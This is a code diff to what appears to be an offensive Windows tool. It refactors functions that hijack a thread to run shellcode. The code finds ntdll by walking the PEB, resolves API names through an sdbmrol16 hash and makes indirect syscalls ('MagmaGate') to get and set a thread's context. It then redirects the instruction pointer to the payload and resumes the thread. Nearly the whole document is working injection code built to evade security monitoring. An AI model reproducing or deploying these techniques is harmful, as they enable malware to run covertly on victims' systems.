@@ -9,32 +9,35 @@ VOID Dumbo(VOID)
 
 BOOL LocalThreadHijack
 (
-	IN HANDLE hProcess,
+	IN  HANDLE  hProcess,
 	OUT HANDLE* hThread,
-	OUT PVOID* pAddress,
-	IN PBYTE pShellcode,
-	IN SIZE_T SizeofShellcode
+	OUT PVOID*  pAddress,
+	IN  PBYTE   pShellcode,
+	IN  SIZE_T  SizeofShellcode
 )
 
 {
 
-	SIZE_T sBytesWritten = NULL;
-	DWORD dwOldProt = NULL;
-	NTSTATUS STATUS = NULL;
-	PVOID rBuffer = NULL;
-	PUCHAR localBuf = NULL;
-	SIZE_T origSize = SizeofShellcode;
-	SIZE_T regionSize = SizeofShellcode;
-	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[4] = { 0 };
+	if (!hProcess || !pShellcode || !SizeofShellcode)
+		return FALSE;
+
+	SIZE_T					sBytesWritten		= 0;
+	DWORD					dwOldProt			= 0;
+	NTSTATUS				STATUS				= STATUS_SUCCESS;
+	PVOID					rBuffer				= NULL;
+	PUCHAR					localBuf			= NULL;
+	SIZE_T					origSize			= SizeofShellcode;
+	SIZE_T					regionSize			= SizeofShellcode;
+	OBJECT_ATTRIBUTES		OA					= { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
+	PIMAGE_EXPORT_DIRECTORY pImgDir				= NULL;
+	SYSCALL_INFO			info				= { 0 };
+	INSTRUCTIONS_INFO		syscallInfos[4]		= { 0 };
 
 	HMODULE ntdll = WalkPeb();
 	if (!ntdll)
 	{
 		PRINT_ERROR("WalkPeb");
-		return 1;
+		return FALSE;
 	}
 
 	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);
@@ -42,7 +45,7 @@ BOOL LocalThreadHijack
 	if (!GetEAT(ntdll, &pImgDir))
 	{
 		PRINT_ERROR("GetEAT");
-		return 1;
+		return FALSE;
 	}
 
 	const CHAR* Functions[] =
@@ -57,10 +60,8 @@ BOOL LocalThreadHijack
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
@@ -143,20 +144,21 @@ BOOL LocalThreadHijack
 BOOL HijackThread
 (
 	IN HANDLE hThread,
-	IN PVOID pAddress
+	IN PVOID  pAddress
 )
 
 {
 
-	NTSTATUS		STATUS = NULL;
-	ULONG suspendedCount = 0;
+	NTSTATUS				STATUS			= STATUS_SUCCESS;
+	ULONG					suspendedCount	= 0;
+	PIMAGE_EXPORT_DIRECTORY pImgDir			= NULL;
+	SYSCALL_INFO			info			= { 0 };
+	INSTRUCTIONS_INFO		syscallInfos[4] = { 0 };
+	CONTEXT					ThreadCtx;
 
-	CONTEXT ThreadCtx;
+
 	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
 	ThreadCtx.ContextFlags = CONTEXT_FULL;
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[4] = { 0 };
 
 	if (!hThread || hThread == INVALID_HANDLE_VALUE || !pAddress) {
 		WARN("Invalid parameters to HijackThread");
@@ -167,7 +169,7 @@ BOOL HijackThread
 	if (!ntdll)
 	{
 		PRINT_ERROR("WalkPeb");
-		return 1;
+		return FALSE;
 	}
 
 	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);
@@ -175,7 +177,7 @@ BOOL HijackThread
 	if (!GetEAT(ntdll, &pImgDir))
 	{
 		PRINT_ERROR("GetEAT");
-		return 1;
+		return FALSE;
 	}
 
 	const CHAR* Functions[] =
@@ -190,10 +192,8 @@ BOOL HijackThread
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
@@ -202,6 +202,7 @@ BOOL HijackThread
 		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
 	}
 	
+	/*----------------------------------------------------------[Get Current Thread Context]-------------------------------------------*/
 
 	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtGetContextThread
 	STATUS = ((NTSTATUS(*)(HANDLE, PCONTEXT))SyscallInvoker)
@@ -215,6 +216,9 @@ BOOL HijackThread
 	printf("[X] | Current RIP Address --> [0x%p]\n", (PVOID)ThreadCtx.Rip);
 
 	OKAY("Successfully got Thread Context!");
+
+	/*----------------------------------------------------------[Change Instruction Pointer to point to our payload]-------------------------------------------*/
+
 
 	ThreadCtx.Rip = (DWORD64)pAddress;
 
@@ -231,6 +235,9 @@ BOOL HijackThread
 
 	OKAY("Successfully set Thread Context!");
 
+	/*----------------------------------------------------------[Resume Suspended Thread]-------------------------------------------*/
+
+
 	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtResumeThread
 	STATUS = ((NTSTATUS(*)(HANDLE, PULONG))SyscallInvoker)
 		(hThread, &suspendedCount);
@@ -242,6 +249,9 @@ BOOL HijackThread
 
 
 	INFO("Resuming Thread....");
+
+	/*----------------------------------------------------------[Waiting For Thread to Finish Executing]-------------------------------------------*/
+
 
 	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtWaitForSingleObject
 	STATUS = ((NTSTATUS(*)(HANDLE, BOOLEAN, PLARGE_INTEGER))SyscallInvoker)
@@ -255,6 +265,13 @@ BOOL HijackThread
 
 	INFO("Waiting for Thread to Finish Executing...");
 
+CLEANUP:
+
+	if (pAddress)
+		VirtualFree(pAddress, 0, MEM_RELEASE);
+
+	if (hThread)
+		CloseHandle(hThread);
 
 	return TRUE;
 }
